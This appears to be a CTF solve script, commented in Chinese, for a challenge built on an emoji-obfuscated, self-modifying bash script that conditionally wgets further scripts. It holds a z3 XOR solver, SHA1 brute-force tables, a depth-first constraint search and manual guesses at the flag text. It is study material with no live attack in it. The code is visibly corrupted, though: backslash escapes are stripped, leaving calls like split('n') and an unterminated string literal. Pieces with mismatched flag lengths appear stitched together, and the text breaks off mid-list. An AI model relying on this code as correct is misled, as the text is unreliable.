dst = [(48, 49, 88), (14, 15, 93), (11, 12, 10), (51, 52, 70), (42, 43, 100), (12, 13, 57), (37, 38, 54), (21, 22, 9), (26, 27, 87), (1, 2, 8), (7, 8, 79), (22, 23, 56), (49, 50, 27), (45, 46, 30), (40, 41, 49), (29, 30, 28), (44, 45, 30), (19, 20, 72), (53, 54, 78), (39, 40, 106), (10, 11, 95), (46, 47, 50), (6, 7, 6), (38, 39, 92), (3, 4, 23), (23, 24, 60), (35, 36, 4), (13, 14, 50), (8, 9, 8), (41, 42, 94), (2, 3, 6), (20, 21, 95), (18, 19, 31), (47, 48, 89), (52, 53, 65), (5, 6, 70), (25, 26, 84), (50, 51, 67), (15, 16, 84), (30, 31, 88), (17, 18, 87), (28, 29, 43), (4, 5, 6), (0, 1, 3), (9, 10, 64), (31, 32, 111), (33, 34, 28), (27, 28, 108), (43, 44, 11), (24, 25, 83), (36, 37, 106), (32, 33, 43), (16, 17, 85), (34, 35, 89)]
got = []
while True:
    s = Solver()
    flag = [BitVec(f"flag{i}", 8) for i in range(55)]
    for i in range(55):
        s.add(flag[i] >= 32)
        s.add(flag[i] < 127)
    for t in dst:
        a, b, x = t
        s.add(flag[a] ^ flag[b] == x)
    for x in got:
        s.add(flag[0] != x)

    if s.check() == sat:
        m = s.model()
        l = []
        for i in range(55):
            l.append(m[flag[i]].as_long())
        got.append(l[0])
        print(bytes(l))
    else:
        break

if sha1(flag[idx:idx+sz])[1] == val:
    wget file1
    GALF *= value1
else:
    wget file2
    GALF *= value2

#!/bin/bash

function 🍋() {
    echo "$1 $2 $3 $4 $5 $6 $7";
    
}
function 👂() { 🍋 $1 $5 $2 $3 $7 $6 $4; }
# 原腳本中的函數定義，省略
function 💘() { 🍋 $4 $7 $3 $1 $2 $5 $6; }

👚 👣 👺 👅 👳 👱 👄 👂
# 原腳本中的emoji，省略
👍 👅 👙 👣 👄 💖 👓 👂

# 從前面的腳本中輸出的命令及其順序
emoji_data = '''👱 👄 👅 👺 👣 👳 👂
👲 👄 👅 👣 💅 👋 👂
👞 👄 👈 👧 👒 💁 💐
💀 👅 👥 👒 💁 💇 👂
💅 👅 👆 👽 💄 💓 👂
💌 👅 👈 👱 👢 👛 👂
👯 👃 💅 👗 💍 💉 👂
💏 👃 💔 👵 💌 👟 👤
👚 👃 👵 💈 👣 💃 👈
💐 👄 👄 💍 👂 👟 👂
👞 👅 👌 👟 👮 💓 💈
👋 👄 👏 👔 👴 👃 👐
💆 👃 👍 💖 💔 👕 👨
💍 👅 👅 👯 💒 👥 👂
👙 👃 👌 👒 👆 👵 👴
👠 👅 👄 👡 👞 👭 💔
👩 👄 👃 💃 👏 💁 👂
💃 👅 👎 👢 👩 👃 👬
👠 👃 👹 👟 👇 👛 👂
👯 👃 👆 👰 👬 👍 💌
💌 👃 👉 👮 💁 👹 👌
👝 👃 👇 👻 👓 👇 💘
👴 👅 👃 👗 💃 💅 👜
💒 👄 👏 👒 👯 👿 💀
👂 👄 👑 👬 👧 👝 👂
👵 👄 👉 👺 👂 👃 👼
💖 👄 👍 👯 👕 👹 👸
💄 👃 👇 💎 👸 💑 👨
👈 👄 👡 💁 👂 👇 👼
👓 👃 👇 💒 👲 👝 👂
👎 👃 👍 👠 👕 👓 👈
💒 👄 👇 👗 👃 👛 👜
👦 👅 👃 👕 💅 👿 👂
👄 👄 👆 👠 💗 💃 💔
💒 👅 👊 👵 💁 👣 💄
👧 👃 👂 💀 👣 👩 👂
👣 👅 👈 💇 💘 💃 👈
💑 👃 👎 💓 👡 👑 👸
👒 👄 👎 💄 👸 👉 👂
💎 👄 👇 👅 👭 👻 💔
💆 👅 👯 👇 👓 👋 👂
👵 👃 👌 👧 👈 👋 👼
💕 👃 💐 💅 👫 👍 👠
👦 👅 👆 👆 👚 👏 💔
💓 👅 👍 👦 👋 👻 👤
👼 👄 👉 👓 👅 👅 👘
💏 👄 👏 💎 👩 👝 💈
👶 👅 👂 👑 👡 👧 💌
👱 👃 👅 💔 💏 👥 👂
👝 👄 👅 👭 👜 💃 👂
💂 👃 💑 💓 👆 👝 👸
👹 👅 👸 👖 👻 💗 👂
👠 👅 👈 👰 💖 👓 👂
💆 👅 👍 👛 👘 👉 👨
👻 👅 👆 💕 👟 👍 💌
👙 👅 👋 💋 💄 👫 👂
👥 👄 👊 👵 💕 👣 👂
👴 👃 👃 👎 👝 👏 👂
👷 👃 👏 👗 👡 👱 👂
👸 👄 👄 💖 👙 👹 👂
💖 👃 👃 👪 👰 👻 👬
💌 👃 👇 👠 👘 👭 👂
💁 👅 💊 💏 👏 👩 👜
👔 👃 👅 👟 👆 👿 👂
👻 👅 👊 💈 💃 👙 👰
👜 👅 👏 👩 👰 💋 👂
👘 👄 👅 💎 👯 👃 👂
👊 👅 👍 👏 👬 👝 👂
👕 👅 👆 💂 👷 👑 👂
👥 👅 👎 👫 💏 👡 👂
💍 👃 👌 👑 👃 💁 👂
👑 👅 👑 💕 💃 💉 👠
👝 👅 👋 👌 👰 👿 👂
👭 👅 👊 👰 👼 👇 👂
👤 👃 👂 👒 💄 💉 👬
💔 👅 👉 💊 💗 💓 👂
👈 👄 👏 💘 👑 👿 💈
👢 👃 👆 👏 👔 💓 💄
👗 👃 👆 👱 👜 👯 👐
👖 👃 👉 👽 👟 👧 👜
👸 👅 👑 👎 👈 👣 👂
👬 👅 👋 👸 💘 👻 💄
👅 👅 👇 👇 👇 👻 👈
💄 👃 👲 💀 💘 👧 👂
👼 👅 💐 💍 👻 💏 👂
👮 👅 👢 💍 👚 💇 💘
👶 👃 👍 👫 👘 👿 👌
👪 👃 👉 👐 👭 👥 👂
💇 👄 👌 👺 👓 👛 👴
👔 👅 👂 💖 👊 👷 👘
💓 👄 👋 💏 👗 👳 👨
👭 👄 👂 👿 👘 👷 👂
👯 👃 👽 👡 👵 👋 👂
💑 👅 💃 👾 💖 👇 👈
💓 👃 👌 💆 👛 💗 💌
👘 👃 👅 👞 👅 👛 👔
👰 👄 👌 👰 👩 💇 💀
👆 👃 👏 👖 👒 👧 👂
👊 👄 👆 💁 👸 👯 💐
👪 👃 👈 👞 💕 👱 👂
👚 👅 👕 💔 👈 👋 👂
💊 👃 👂 👣 💂 💃 👂
💈 👃 👖 👂 💌 💓 👂
👖 👅 👈 👣 👋 👥 👴
👳 👅 👂 👿 👷 💗 👂
👻 👄 👉 💕 👓 👯 👂
💕 👃 👇 👘 💑 👉 👂
👏 👃 👇 👱 💌 👱 👂
👺 👃 👂 👦 👋 💃 👈
💁 👃 💇 👄 👂 👣 👈
💐 👄 👈 💀 👈 👷 👸
👄 👅 👆 💔 👪 👛 👂
👕 👄 👌 👲 💓 👅 👬
👨 👄 👊 💋 👎 👋 👼
💀 👄 👉 💂 👢 👅 👂
👅 👅 💐 👟 👧 👭 👂
👐 👄 💌 👟 💕 👱 👈
👞 👃 👂 💘 💆 👱 👂
👸 👃 👑 👷 👵 👻 👘
👅 👃 👊 👌 👶 👛 👂
👌 👅 👍 👩 👫 💁 👂
👑 👅 👌 👩 👻 👗 👠
👨 👅 👏 💀 👭 👥 👜
💇 👃 👏 👊 💔 👑 👤
💅 👃 👷 👿 👇 💓 👂
👃 👄 👽 💈 👃 👇 👠
👛 👃 👅 👩 👔 👗 💄
👇 👄 👌 👦 👮 👍 💄
💄 👅 👌 💌 👞 👡 💔
💈 👅 👐 👥 💈 👕 👂
👿 👃 👃 👾 👍 👣 👂
👲 👃 👎 💍 👬 💓 👂
👳 👄 👑 👻 👓 👿 👂
👮 👃 👅 👐 👌 👗 💔
👆 👃 👡 👯 💊 👅 👂
👆 👄 👏 💒 👛 💉 👂
👠 👄 👂 👖 👒 👽 👄
💐 👅 👈 💑 👆 👧 👂
👽 👄 👦 👴 👵 👳 👂
👨 👃 👅 👳 👨 👣 👂
👐 👄 👍 💅 💗 👓 👬
💖 👅 👄 👨 👃 👋 👂
👗 👄 👗 💇 👂 💏 👂
👸 👃 👈 👚 👽 👱 👂
👛 👅 👅 👧 👨 👳 👂
👿 👅 👌 👃 👉 👥 💐
👉 👃 👍 👣 👅 👥 👂
👫 👅 👆 💔 👾 👉 💄
👮 👄 👊 👬 💏 💁 👂
💐 👃 👈 👂 👲 💇 👂
💒 👃 👇 💘 👉 💗 👂
👥 👃 👃 💁 👜 💏 👂
💊 👄 👏 👶 👚 💍 💌
💅 👄 👆 💐 💗 👫 👴
💍 👅 👋 👕 👹 💓 👂
👖 👃 👃 💅 👥 👯 👂
👨 👄 👌 💂 💐 💗 👂
👓 👃 💒 💀 💌 👵 👰
👐 👅 👑 👳 👣 👥 👨
👶 👃 👉 💃 💘 💓 👂
💁 👅 👈 👄 💊 👕 💔
👠 👅 👆 💌 👙 👷 👤
👽 👄 👏 👔 👑 👇 💔
💐 👃 👅 👝 👳 👳 👂
💇 👅 👈 👈 👶 💇 👂
💋 👃 👉 💁 💀 💓 👸
👗 👄 👆 💋 💂 👿 👨
👫 👄 👇 👈 👩 👟 👂
👌 👃 👉 👷 👒 👿 💐
👳 👄 👑 👆 👡 👻 👸
👱 👅 👠 💎 💌 💕 👂
👚 👅 👇 👯 👕 👟 👂
👣 👃 👏 👼 👰 👽 👂
👰 👃 👉 👰 💍 👝 👂
💋 👄 👎 👦 👺 👕 👈
👟 👅 👏 👒 👳 👷 👂
👜 👄 👈 👇 💎 💃 👂
👮 👅 👂 👿 👢 👿 👂
👃 👅 👐 👐 👰 👻 👂
💂 👄 👏 👙 👹 👋 👂
💎 👅 👄 💑 👾 👷 💘
💏 👃 👍 👛 👤 💍 👤
💃 👄 👬 💔 👈 💅 👂
👊 👃 👂 👗 👑 👕 👼
👿 👃 👉 👪 👎 👱 👂
👶 👃 👉 👈 💓 💏 👈
👛 👃 👓 👬 👲 👅 👂
💑 👃 👃 👒 👨 💅 👂
👾 👅 👍 💔 👖 💃 👂
👚 👄 👌 💘 👗 💉 👂
👜 👅 👎 💗 👋 👩 👠
💑 👄 👐 💃 👇 👏 💔
👵 👄 👊 💐 👡 👳 👂
👂 👅 👉 👶 👟 💉 💈
👹 👃 👃 👖 👎 👷 👂
👜 👃 👋 💔 👍 👃 👰
👐 👃 👃 👺 💅 👻 👂
👤 👅 💇 💀 💔 💋 👼
👪 👄 👐 👱 💗 👉 👬
👠 👃 👅 💖 👻 👻 👰
👪 👅 👑 💎 👷 👙 👰
👩 👃 👆 💐 💅 👭 👂
👡 👅 👑 👎 👓 👝 👘
💂 👃 👉 👂 👙 👯 👂
👦 👃 👝 👩 💑 👡 👰
👘 👅 👎 👅 👗 👯 👂
👧 👄 👇 👇 👛 👥 💌
💕 👄 👆 👰 👨 👛 👂
👽 👃 👉 👚 👫 💉 👨
💗 👃 👌 💔 👯 👽 👂
👆 👅 👋 👋 👫 👯 👂
👻 👃 👅 👙 💆 👯 👂
👵 👅 👍 👊 👣 👻 💄
👎 👅 👋 👃 💌 👹 👂
👃 👄 👄 💈 👡 👥 👂
👍 👄 👆 👘 👨 👧 👄
👫 👃 👇 💖 👲 👟 👂
💂 👃 👉 👿 👡 👱 👸
💘 👃 👄 👒 👸 💓 👂
💄 👅 👃 💓 👏 💉 👂
👃 👃 👅 👋 👚 👋 👔
👶 👃 💉 👺 👚 💍 👂
👾 👄 👅 👬 👰 👽 💄
👼 👅 👆 👬 💍 👙 💐
👕 👅 👏 👑 💊 💁 👂
👤 👄 👄 👢 👍 💋 👂
💅 👃 👅 👶 💐 👇 👤
👉 👄 👃 💈 👜 👑 👔
👉 👅 👃 💊 💌 👗 👘
💆 👄 👍 👻 👠 👳 👸
💌 👅 👴 👚 👈 👃 💄
👲 👅 👂 💎 👷 👯 👂
👈 👃 👍 👆 👳 💓 💀
💏 👅 👄 👉 💇 👓 👄
💍 👅 👄 👰 💃 💃 👂
👹 👅 👉 👺 👣 💕 👂
💓 👄 💁 👅 👨 👱 👴
💉 👅 👚 👼 👼 💅 👂
👂 👃 👉 👼 👍 💁 💌
👭 👃 👎 👔 👷 👩 💘
💁 👃 👂 👙 💔 👹 👼
👬 👄 👃 💂 👙 💍 👂
💉 👅 👇 👭 👍 💕 👂
👛 👄 👊 👈 💘 👯 👐
👍 👃 👉 💅 👺 👳 💀
💕 👅 👎 👅 👖 👵 💐
👱 👅 👌 👛 👙 👷 👔
👓 👅 👌 👱 👉 💉 👂
👯 👅 👇 👿 💅 👃 👄
👶 👅 💆 💕 👌 👧 👂
👅 👄 👂 👴 👳 👉 👂
👼 👃 👑 👮 💈 👳 👠
👗 👅 👏 👸 👆 👭 👴
👓 👄 👋 👽 👮 👯 👤
👘 👃 👇 👸 💍 👿 👂
👙 👄 👅 👣 💖 👓 👂'''

def emoji_idx(x):
    if x == "❤️":
        return 87
    return ord(x)-ord("👂")

def emoji_zero_bits(x):
    x = bin(ord(x))[2:]
    return len(x) - x.rindex("1") - 1

emoji = ["👂", "👃", "👄", "👅", "👆", "👇", "👈", "👉", "👊", "👋", "👌", "👍", "👎", "👏", "👐", "👑", "👒", "👓", "👔", "👕", "👖", "👗", "👘", "👙", "👚", "👛", "👜", "👝", "👞", "👟", "👠", "👡", "👢", "👣", "👤", "👥", "👦", "👧", "👨", "👩", "👪", "👫", "👬", "👭", "👮", "👯", "👰", "👱", "👲", "👳", "👴", "👵", "👶", "👷", "👸", "👹", "👺", "👻", "👼", "👽", "👾", "👿", "💀", "💁", "💂", "💃", "💄", "💅", "💆", "💇", "💈", "💉", "💊", "💋", "💌", "💍", "💎", "💏", "💐", "💑", "💒", "💓", "💔", "💕", "💖", "💗", "💘", "❤️"]
assert [emoji_idx(x) for x in emoji] == list(range(88))
emoji_data = emoji_data.split("n")
emoji_data = [list(map(lambda x: emoji_idx(x), l.split(" ")[:5])) + list(map(lambda x: emoji_zero_bits(x), l.split(" ")[5:])) for l in emoji_data]
file_data = []
sha1_tables = []
PH = "."
FLAGLEN = 87
MAXSZ = 3

def init():
    import string
    from hashlib import sha1
    from itertools import product
    def getFromShell(file):
        l = []
        with open(f"download/{file}.sh", "r") as f:
            data = f.read().split("n")
            for i in range(103, 359):
                l.append(1 if data[i][-1] == "\" else 0)
        return l
    def getSha1Tables(n):
        d = {}
        for t in product(charset, repeat=n):
            if "{" in t and "}" in t:
                continue
            s = ''.join(t)
            if (x:=sha1(s.encode()).hexdigest()[1]) not in d.keys():
                d.update({x: [s]})
            else:
                d[x].append(s)
        return d
    # 取得所有下載的腳本的內容
    for i in range(88):
        file_data.append(getFromShell(emoji[i]))
    # 打表sha1 0-9A-Za-z_{}
    charset = string.digits + string.ascii_letters + "_{}"
    for i in range(4):
        sha1_tables.append(getSha1Tables(i))
    # 清空日誌
    with open("flag_log", "w") as f:
        f.write("")
    return

MAX_CNT = 64
def dfs(start):
    global MAX_CNT
    def getCondChars(idx):
        return set().union(*[set(s[i] for s in eq_conds[idx-i] if i < len(s)) for i in range(min(idx+1, MAXSZ))])
    def getCondIntrsct(idx0, idx1):
        assert idx0 < idx1 and idx1 - idx0 <= 2
        cond_chars_0 = set(s[idx1 - idx0] for s in eq_conds[idx0] if idx1 - idx0 < len(s))
        cond_chars_1 = set(s[0] for s in eq_conds[idx1])
        cond = cond_chars_0.intersection(cond_chars_1)
        # flag格式
        if idx1 not in [8, 86]:
            cond.discard("{")
            cond.discard("}")
        if not cond_chars_0 or (cond == cond_chars_0 and cond == cond_chars_1):
            return False
        eq_conds[idx0] = set(s for s in eq_conds[idx0] if idx1 - idx0 >= len(s) or s[idx1 - idx0] in cond)
        eq_conds[idx1] = set(s for s in eq_conds[idx1] if s[0] in cond)
        return True
    def getFlagChars(cur_idx):
        if flag_chars[cur_idx] != PH or len(s:=getCondChars(cur_idx)) == 1:
            if flag_chars[cur_idx] == PH:
                flag_chars[cur_idx] = s.pop()
            eq_conds[cur_idx] = set(s for s in eq_conds[cur_idx] if s[0] == flag_chars[cur_idx])
        for idx in range(max(cur_idx-MAXSZ+1, 0), cur_idx):
            if getCondIntrsct(idx, cur_idx):
                getFlagChars(idx)
                getFlagChars(cur_idx)
        for idx in range(cur_idx+1, min(cur_idx+MAXSZ, FLAGLEN)):
            if getCondIntrsct(cur_idx, idx):
                getFlagChars(cur_idx)
                getFlagChars(idx)
        return
    q = deque()
    q.append(start)
    while q:
        cur = q.pop()
        file_idx, line_idx, eq_conds, neq_conds, flag_chars, zero_cnt = cur
        if zero_cnt >= MAX_CNT:
            continue
        if line_idx >= len(emoji_data):
            break
        # print(file_idx, line_idx, zero_cnt, emoji_data[line_idx])
        hash_idx, hash_sz, hash_dst, eq_jmp, neq_jmp, eq_val, neq_val = emoji_data[line_idx]
        hash_dst = hex(hash_dst)[2:]
        # 計算新的line_idx
        while file_data[file_idx][line_idx] == 1:
            line_idx += 1
        line_idx += 1
        assert eq_val == 0
        # not equal分支
        new_neq_conds = deepcopy(neq_conds)
        new_eq_conds = deepcopy(eq_conds)
        if len(hash_dst) == 1:
            new_neq_conds[hash_idx] |= set(sha1_tables[hash_sz][hash_dst])
        # 刪除與neq_conds有交集的約束
        new_eq_conds[hash_idx].difference_update(new_neq_conds[hash_idx])
        q.append((neq_jmp, line_idx, new_eq_conds, new_neq_conds, flag_chars.copy(), zero_cnt+neq_val))
        if len(hash_dst) > 1: # 不可能equal
            continue
        # equal分支
        # 尋找可加入約束中的字串
        cond_chars = [getCondChars(hash_idx+i) for i in range(hash_sz)]
        # 兩個"_"相連不太可能
        tmp_to_add = set(s for s in sha1_tables[hash_sz][hash_dst] if "__" not in s)
        for i in range(hash_sz):
            if cond_chars[i]:
                rm = set(x for x in tmp_to_add if x[i] not in cond_chars[i])
                tmp_to_add.difference_update(rm)
        # 與原有約束沒有交集，丟棄節點
        if not tmp_to_add:
            continue
        # 刪除原約束中不與新約束相交的部分
        cond_chars = [set(s[i] for s in tmp_to_add) for i in range(hash_sz)]
        for i in range(hash_sz):
            idx = hash_idx + i
            for j in range(min(idx+1, MAXSZ)):
                rm = set(s for s in eq_conds[idx-j] if j < len(s) and s[j] not in cond_chars[i])
                eq_conds[idx-j].difference_update(rm)
        eq_conds[hash_idx].update(tmp_to_add)
        # 刪除與neq_conds有交集的約束
        eq_conds[hash_idx].difference_update(neq_conds[hash_idx])
        q.append((eq_jmp, line_idx, eq_conds, deepcopy(neq_conds), flag_chars.copy(), zero_cnt))
    with open("flag_log", "a") as f:
        for idx in range(FLAGLEN):
            getFlagChars(idx)
        f.write(''.join(flag_chars)+"n")
        print(''.join(flag_chars))
        for i in [idx for idx in range(FLAGLEN) if flag_chars[idx] == PH]:
        # for i in range(FLAGLEN):
            f.write(f" {i}: {eq_conds[i]}n")
    return

if __name__ == '__main__':
    from collections import deque
    from copy import deepcopy

    init()
    d = {}
    for i in range(FLAGLEN):
        d.update({i: set()})
    dfs((emoji_idx("❤️"), 0, deepcopy(d), deepcopy(d), [PH]*FLAGLEN, 0))

### 猜測時間到！
## flag格式
flag_chars[0] = 'h'
flag_chars[1] = 'k'
flag_chars[8] = '{'
## 兩個單字之間
# s33m1n9ly.b3g19n
# 18: {'_b3', 'Y', '_'}
flag_chars[18] = '_'
## .m0d1.y1n9 -> _modifying
# 76: {'Fm0', '_m0', '_m'}
# 81: {'v', 'f', 'fy', 'fy1'}
flag_chars[81] = 'f'
flag_chars[76] = '_'
## ..3lf -> _self
# 71: {'8s3', '_s3', '_E3'}
# 72: {'s', 's3', 'E'}
flag_chars[72] = 's'
flag_chars[71] = '_'
## d4n93r0... -> dangerous_
# 55: {'us_', 'Ls_', 'u', 'p', 'L', 'LsQ', 'u7_'}
# 56: {'7', 's'}
# 57: {'_w', 'Q', '_wh', '_'}
flag_chars[55] = 'u'
flag_chars[56] = 's'
flag_chars[57] = '_'
## wh....... -> wh.....ey
# 60: {'3Pe', '3n', '0uc', '36C', '0uJ', '0nJ', '3PO', '3p5', '0pC', '3ne', '3Lg', '0pJ', '3pO', '3P5', '3xC', '3p', '3xP', '0p3', '3u0', '3n_', '0xc', '06', '3x_'}
# 61: {'pgs', 'L', 'uCD', 'u', 'nCD', 'P3X', 'nPs', 'L5X', 'x', '6', 'nOE', '60D', 'p3X', 'L5E', 'pCX', '6cD', '6J7', 'n', 'p', 'LgZ', 'LgX', 'PgX', 'ucE', 'xOE', 'P', 'u0D', 'LcX', '6gE', 'ue7', 'n_7', '607', 'xPZ', '65Z', 'xc7', 'PgE', 'uPZ', 'P_X'}
# 62: {'3X', 'CD', 'gE', 'eE', 'eZ', '3s', 'O7', '3Z', '_7', '5D', 'PD', 'cs', '0s', 'JE', 'CE'}
# 63: {'D', 'E', 'X3Y', 'X', 'Dh3', '7', 's', '7KY', '7h3', 'Z'}
# 64: {'K', 'h', 'hY', 'h3', '3'}
# 65: {'3y_', 'YN_'}
# 66: {'N', 'y', 'y_4'}
flag_chars[65] = '3' # 沒有字尾會是YN相連的吧
flag_chars[66] = 'y'
## wh....h3y -> wh...they
# 60: {'0uc', '3Lg', '3PO', '06', '0uJ', '0pC', '3ne', '3xC', '3n_', '3xP', '0nJ', '3Pe', '0p3', '3P5', '3p5', '3u0', '3x_', '3p', '36C', '3pO', '0xc', '0pJ', '3n'}
# 61: {'u0D', 'u', 'p', '60D', 'ucE', 'P3X', 'P', '6', 'nPs', 'uPZ', 'LcX', 'nOE', 'LgX', 'n', 'pCX', '6J7', 'pgs', 'LgZ', 'xc7', 'nCD', '65Z', 'L5X', 'xPZ', 'L5E', 'uCD', '6gE', 'PgE', 'ue7', 'x', 'xOE', 'P_X', 'p3X', '607', '6cD', 'PgX', 'n_7', 'L'}
# 62: {'CE', 'CD', '3s', '3Z', '5D', 'JE', '0s', '3X', 'O7', 'cs', 'eZ', 'eE', '_7', 'gE', 'PD'}
# 63: {'7h3', '7', 'D', 'X', 's', 'Dh3', 'E', 'Z'}
flag_chars[63] = '7' # the和dhe，怎麼看都只能選the吧
## wh.._7h3y -> wh.._they
# 60: {'3n', '3p', '3x_', '3n_', '06'}
# 61: {'p', 'n', '6', 'n_7', 'x'}
flag_chars[61] = 'n' # when?
## b............c0.....3 -> ba...........co.....e
# 27: {'4s', 'xEG', '4sh', 'xEc', 'xED', 'xsV', '4s1', '4E_', '4EQ'}
flag_chars[27] = '4' # ba和bx的開頭，看起來ba可靠點
## b4sh_scr.....c0.....3 -> bash_scripts_co.....e
# 34: {'Nn', '3x', 'p6', 'Z6', 'Rp', '1p', 'op', '0u', 'Qx'}
# 35: {'pMs', 'xo', '6S', 'n7s', '6Ns', 'uEs', 'p7', 'nH', '6_Z', 'n_Z', 'xoZ', 'p', 'nms', 'x6', 'x', 'ntZ', '6H', 'pIZ', 'u', 'p7s', 'nEZ', 'uQs', '6Qs', 'nuZ', '6', 'nIs', 'xdZ', 'xws', 'nI', 'n'}
# 36: {'6sQ', '_s_', 'ws_', 'Qsk', 'MZk', 'SsQ', 'EsY', 'oZ_', 'EZ_', 'IsY', 'mZ_', 'dZk', '7s_', '7Zk', 'tsQ', 'wsk', 'SZk', 'wZk', 'Hsk', 'usY', 'osQ', 'NZ_'}
# 37: {'Z', 's_', 'Zk', 's', 'ZY', 'sQ'}
# 38: {'Y', 'k', '_', '_c', '_c0', 'Q'}
# bash scripts? 36是"_"的話單字太短了，只能38是底線了
flag_chars[34] = '1'
flag_chars[35] = 'p'
flag_chars[36] = '7'
flag_chars[37] = 's'
flag_chars[38] = '_'
## c0.....3 -> co..._.e
# 41: {'IUd', 'Wkj', '1P', 'Znd', 'Xs', 'HI', 'P1H', 'b1j', 'mkd', 'VI', 'Wp5', 'lPd', 'tXd', 'qeH', 'yzd', 'PIH', 'mr5', 'Gej', 'xPH', 'ytH', 'ePH', 'x1H', 'vY', '9Id', 'EH', 'VZ5', 'hzd', 'xH', 'Vnd', 'htd', 'orj', '7YH', 'hnH', 'ePj', 'jH', 'ezH', 'EkH', 'vrd', 'lH5', 'DeH', 'IXj', '1SH', '7td', 'Lt5', '8Y', 'xS5', 'JnH', 'JpH', 'hZj', 'HHd', 'jsj', 'es5', 'eX5', 'KHH', 'Bsj', 'qXd', 'NwH', 'Wnd', '8s', 'yZj', '4U', '_k5', 'bk5', 'xwd', 'HU5', 'Gs', 'kz5', 'Wp', 'QXd', 'xrd', 'sSj', '4X', 'mej', 'xk', 'Tn', 'Q15', 'EsH', 'ie5', 'VzH', 'h1j', 'H0', 'KZj', 'Vrd', 'iUd', 'swd', 'BHH', 'Qzj', 'xHd', 'PwH', '_sj', 'xId', 'brj', '1Uj', 'vH5', 'eI', 'qr', 'j1H', 'vY5', 'Tsj', '1sH', '7H5', 'jej', 'skj', 'ktd', 'EHj', 'qrj', 'PpH', 'JUH', '5Ud', 'yHj', 'Lw', '4HH', 'ewH', 'KUd', 'Csd', '6e', 'D0', 'QU', 'etj', 'Nr5', '9e5', 'LI5', 'sHH', '6pd', 'D1H', 'u1', 'et', 'WY5', 'vXd', 'Btd', 'JS', 'bp5', '_r5', 'Ls', 'eH5', 'hZ5', 'sYd', '5XH', 'Qej', 'J15', 'ZY', '5ZH', 'ur5', 'BI5', 'utH', 'otj', 'KS', 'NeH', 'u1d', 'qwj', 'hI', '4Id', 'HY', '7wH', 'TS5', 'ezj', 'Pe', '5nj', 'aH5', 't0', 'Lk', 'vHj', '_p', 'jPj', 'HtH', 'bP', 'usj', 'qY5', 'Dwj', 'xtH', '8UH', 'EZ5', 'qZH', 'BYj', 'kt', 'Zk', '4p5', 'twH', 't1j', '4sH', 'Ird', 'BUj', 'tIj', '8e5', 'QP', 'i0', 'ys5', '_05', '4s5', 'XU', 'Gwd', '5Hj', 'mZ', '9YH', 'yrj', '6H5', 'Zwd', 'Xrj', 'yI', 'hrj', 'uIH', 'kHH', '_ZH', 't1', 'oXj', '1S', 'IY', 'QSj', 'GId', 'Qwd', 'QHH', '5YH', 'jId', 'sz', 'ZX5', 'JZ5', '6r5', 'GI5', 'tX', 'uZj', 'zId', 'Jw5', 'IZd', 'Hw', 'T0j', 'Ktj', 'G05', 'u1j', '6nj', 'Zrj', 'LsH', 'aUd', 'hej', '7ed', 'LkH', 'sId', 'ZZj', 'tSH', 'Zw', 'Twj', 'btj', 'Qrj', 'v1d', 'QeH', '8ZH', 'op5', '_0', 'hnd', 'Ez5', 'Qrd', 'ktH', 'ke', 'qwd', 'kPj', 'Pe5', 'KYd', '6Zd', 'DPH', 'mzH', '615', '_rj', 'ZHH', 'Tkd', 'Ekd', 'Npj', 'L0j', '4kd', '5X5', 'HU', 'Pp5', 'Hk5', 'sU5', 'PX5', 'Gp5', 'ztd', '6k5', 'hS', 'K0H', 'bI5', 'ZkH', 'IX5'}
# 42: {'H5Y', '1d_', 's5Q', 'nd', 'ed', 'U5', 'r5', 'SHY', 'Hj', 'zH', 'Sj', '1HG', 'td', 'P5', 'p5', 'wd', 'PjQ', '15', 'sH', '1jY', 'kj', 'wj_', 'sjG', 's5', '05Q', 'kd_', 'ZdG', 'kH_', 'XdQ', 'H5_', 'nd_', 'Xd', 'I5G', 'n5G', 'tHG', 'Zd', 'I5', 'sHY', '1d', '0j', 'YdQ', 'Y5', 'Ud', '0jQ', 'IHG', 'Z5Y'}
# 43: {'jGh', 'd_b', '5', 'd', 'dQh', '5Qb', 'jYh', 'H', 'j', 'd_'}
# 44: {'_b3', 'G', 'Q', '_b', 'Gb3', 'Y', '_', 'Yh3', '_h'}
# 45: {'h3_', 'b3_'}
flag_chars[44] = '_' # 42-44的條件中44都有可能是底線，試試
## c0..._b3 -> co..._be
# 41: {'9YH', 'iUd', 'D0', 'xwd', 'HU5', 'IZd', 'j1H', 'jsj', 'op5', 'usj', 'yHj', 'J15', 'Nr5', '5nj', '9Id', 'hS', '5X5', 'hrj', 'Ird', 'xrd', 'xk', 'P1H', 'brj', 'bp5', 'kt', 'Ekd', '7td', 'htd', 'ewH', 'etj', 'D1H', '1P', 'bk5', 'qrj', 'K0H', 'JUH', 'es5', '_sj', 'IX5', 'Tkd', '8UH', '6H5', 'lPd', 'EHj', 'ZkH', 'JpH', 'Qwd', 'swd', 'EZ5', 'Gp5', 'Qej', 'oXj', 'sSj', 'vHj', 'DPH', 'xH', 'sU5', 'uZj', '615', 'hI', '1sH', 'qZH', '4X', 'QeH', '5XH', '5ZH', 'PX5', 'Q15', 'BHH', 'QXd', 'HU', 'KS', 'orj', 'LsH', 'Npj', 'xPH', '7YH', 'twH', 'PwH', 'kPj', 'hnd', 'hzd', 'Wp5', 'vrd', 'XU', 'Xs', 't1', 'QSj', 'LkH', '4p5', '8e5', '4sH', 'kz5', 'ezH', 'i0', 'Hk5', 'VzH', 'HHd', 'IY', 'Lt5', 'Tsj', 'WY5', 'BUj', '8ZH', 'H0', 'Lw', 'bI5', '1S', 'ZZj', 'zId', 'x1H', 'qY5', 'IUd', 'HtH', '4Id', 'yzd', 'KHH', 'ePj', '_0', '6r5', '4HH', 'GId', 'qwj', 'LI5', 'aUd', 'Zrj', 'mej', 'Gej', 'ePH', 'BYj', 'EsH', 'ZHH', 'hnH', 'eH5', 'vY', 'v1d', 'ie5', '_r5', 'kHH', 'ZX5', 'Btd', 'ke', 'sId', 'tX', 'Ez5', 'lH5', 'hZ5', 'Zw', 'qeH', 'Znd', 'mzH', 'EkH', '6k5', 'vXd', 'KZj', '_rj', 'mZ', 'u1d', 'JnH', 'Pe', 'Qrj', 'Dwj', '6Zd', 'tIj', '8s', 'xtH', 'aH5', 'btj', 'Gs', 'QP', 'yrj', 'T0j', '7wH', '_p', 'Hw', 'VI', 'Qrd', 'Csd', 'eI', 'Pp5', 'KYd', 'Qzj', 'NwH', 'eX5', 'sz', 'DeH', 'mr5', 'Twj', 'NeH', '7H5', 'yI', 'tXd', 'h1j', 'vH5', 'ztd', '5Ud', 'TS5', 'Bsj', 'Ls', 'JZ5', 'hZj', 'EH', '6nj', 'ur5', 'PIH', 'QHH', 'Lk', 